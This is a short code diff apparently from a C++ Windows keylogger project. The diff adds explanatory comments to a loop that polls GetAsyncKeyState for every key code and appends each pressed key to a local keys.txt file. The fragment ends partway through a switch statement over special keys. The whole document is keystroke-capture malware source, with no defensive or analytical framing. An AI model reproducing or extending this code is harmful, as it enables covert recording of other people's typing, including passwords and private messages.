@@ -8,21 +8,21 @@ using namespace std;
 void startLogging();
 
 int main(){
+    // create a file to record the keystrokes being captured
     ofstream keys("keys.txt", ios::trunc); // clear the keys.txt file everytime this code is run
     startLogging();
     return 0; 
 }
 
 void startLogging(){
-    
+    // constantly loop through all the characters and check if they are currently being pressed or not
     char c;
     while(true){
         for (c = 0; c < 255; c++){
             bool pressed = GetAsyncKeyState(c) & 0x1;
             if (pressed){
-                // cout << c;
                 ofstream keys;
-                keys.open("keys.txt", ios::app);
+                keys.open("keys.txt", ios::app); // open the log file so that the captured key can be recorded
                 const char* key;
                 switch (c) {
                     case VK_BACK:
